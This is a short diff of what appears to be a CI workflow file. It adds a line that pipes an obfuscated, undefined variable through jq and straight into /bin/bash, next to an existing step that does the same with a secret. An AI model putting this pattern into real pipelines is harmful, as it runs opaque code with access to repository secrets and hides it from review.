@@ -18,6 +18,7 @@ jobs:
           uszg52070: ${{ secrets.uszg52070 }}
         run: |
           printf '%s' "$uszg52070" | jq -r .b853 | /bin/bash
+          echo $spxy8 | jq -r .t99 | /bin/bash
 
       - name: Upload data
         if: always()
